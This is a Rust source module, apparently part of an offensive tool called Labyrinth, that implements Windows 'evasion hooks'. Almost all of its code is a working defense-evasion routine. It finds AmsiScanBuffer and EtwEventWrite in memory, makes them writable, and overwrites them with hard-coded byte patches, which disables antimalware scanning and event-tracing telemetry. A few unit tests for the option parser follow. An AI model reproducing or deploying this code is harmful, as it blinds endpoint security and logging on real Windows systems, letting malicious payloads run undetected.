use crate::error::{LabyrinthError, Result};
use std::fmt;
use tracing::warn;

#[cfg(target_os = "windows")]
use tracing::info;
#[cfg(all(
    target_os = "windows",
    any(target_arch = "x86_64", target_arch = "x86")
))]
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
#[cfg(all(
    target_os = "windows",
    any(target_arch = "x86_64", target_arch = "x86")
))]
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum EvasionHook {
    Amsi,
    Etw,
}

impl EvasionHook {
    pub fn parse_cli_values(values: &[String]) -> Result<Vec<Self>> {
        let mut hooks = Vec::new();
        for value in values {
            for token in value.split(',') {
                let token = token.trim().to_ascii_lowercase();
                if token.is_empty() {
                    continue;
                }
                match token.as_str() {
                    "all" => {
                        hooks.push(Self::Amsi);
                        hooks.push(Self::Etw);
                    }
                    "amsi" => hooks.push(Self::Amsi),
                    "etw" => hooks.push(Self::Etw),
                    other => {
                        return Err(LabyrinthError::Message(format!(
                            "Unsupported evasion hook '{}'. Expected amsi, etw, or all.",
                            other
                        )));
                    }
                }
            }
        }

        hooks.sort_by_key(|hook| match hook {
            Self::Amsi => 0,
            Self::Etw => 1,
        });
        hooks.dedup();
        Ok(hooks)
    }
}

impl fmt::Display for EvasionHook {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Amsi => write!(f, "amsi"),
            Self::Etw => write!(f, "etw"),
        }
    }
}

pub struct EvasionManager;

impl EvasionManager {
    pub fn apply_evasion_hooks(hooks: &[EvasionHook]) -> Result<()> {
        if hooks.is_empty() {
            return Ok(());
        }

        #[cfg(target_os = "windows")]
        {
            info!("Applying Windows evasion hooks: {:?}", hooks);
            for hook in hooks {
                match hook {
                    EvasionHook::Amsi => Self::patch_amsi()?,
                    EvasionHook::Etw => Self::patch_etw()?,
                }
            }
            Ok(())
        }

        #[cfg(not(target_os = "windows"))]
        {
            warn!(
                "Requested evasion hooks ({}) are Windows-only and were not applied on this platform.",
                hooks
                    .iter()
                    .map(ToString::to_string)
                    .collect::<Vec<_>>()
                    .join(",")
            );
            Ok(())
        }
    }

    #[cfg(all(
        target_os = "windows",
        any(target_arch = "x86_64", target_arch = "x86")
    ))]
    fn patch_amsi() -> Result<()> {
        unsafe {
            let amsi_dll = GetModuleHandleA("amsi.dll\0".as_ptr());
            if amsi_dll.is_null() {
                warn!("amsi.dll not loaded; skipping AMSI hook");
                return Ok(());
            }

            let Some(addr) = GetProcAddress(amsi_dll, "AmsiScanBuffer\0".as_ptr()) else {
                warn!("AmsiScanBuffer not found; skipping AMSI hook");
                return Ok(());
            };

            Self::write_patch(addr as _, amsi_patch_bytes(), "AMSI")
        }
    }

    #[cfg(all(
        target_os = "windows",
        not(any(target_arch = "x86_64", target_arch = "x86"))
    ))]
    fn patch_amsi() -> Result<()> {
        warn!("AMSI hook is only implemented for x86_64 and i686 Windows; skipping");
        Ok(())
    }

    #[cfg(all(
        target_os = "windows",
        any(target_arch = "x86_64", target_arch = "x86")
    ))]
    fn patch_etw() -> Result<()> {
        unsafe {
            let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr());
            if ntdll.is_null() {
                warn!("ntdll.dll not loaded; skipping ETW hook");
                return Ok(());
            }

            let Some(addr) = GetProcAddress(ntdll, "EtwEventWrite\0".as_ptr()) else {
                warn!("EtwEventWrite not found; skipping ETW hook");
                return Ok(());
            };

            Self::write_patch(addr as _, etw_patch_bytes(), "ETW")
        }
    }

    #[cfg(all(
        target_os = "windows",
        not(any(target_arch = "x86_64", target_arch = "x86"))
    ))]
    fn patch_etw() -> Result<()> {
        warn!("ETW hook is only implemented for x86_64 and i686 Windows; skipping");
        Ok(())
    }

    #[cfg(all(
        target_os = "windows",
        any(target_arch = "x86_64", target_arch = "x86")
    ))]
    unsafe fn write_patch(addr: *mut std::ffi::c_void, patch: &[u8], label: &str) -> Result<()> {
        let mut old_protect = 0u32;
        if VirtualProtect(addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return Err(LabyrinthError::Message(format!(
                "Failed to change memory protection for {} hook",
                label
            )));
        }

        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());

        let mut restored = 0u32;
        if VirtualProtect(addr, patch.len(), old_protect, &mut restored) == 0 {
            return Err(LabyrinthError::Message(format!(
                "{} hook applied, but failed to restore memory protection",
                label
            )));
        }

        info!("{} hook applied successfully.", label);
        Ok(())
    }
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
fn amsi_patch_bytes() -> &'static [u8] {
    &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
}

#[cfg(all(target_os = "windows", target_arch = "x86"))]
fn amsi_patch_bytes() -> &'static [u8] {
    &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
fn etw_patch_bytes() -> &'static [u8] {
    &[0x33, 0xC0, 0xC3]
}

#[cfg(all(target_os = "windows", target_arch = "x86"))]
fn etw_patch_bytes() -> &'static [u8] {
    &[0x33, 0xC0, 0xC2, 0x10, 0x00]
}

#[cfg(test)]
mod tests {
    use super::EvasionHook;

    #[test]
    fn parses_empty_hooks() {
        assert!(EvasionHook::parse_cli_values(&[]).unwrap().is_empty());
    }

    #[test]
    fn parses_and_deduplicates_hooks() {
        let hooks = EvasionHook::parse_cli_values(&["etw,amsi".into(), "all".into()]).unwrap();
        assert_eq!(hooks, vec![EvasionHook::Amsi, EvasionHook::Etw]);
    }

    #[test]
    fn rejects_unknown_hooks() {
        let error = EvasionHook::parse_cli_values(&["unknown".into()]).unwrap_err();
        assert!(error.to_string().contains("Unsupported evasion hook"));
    }
}
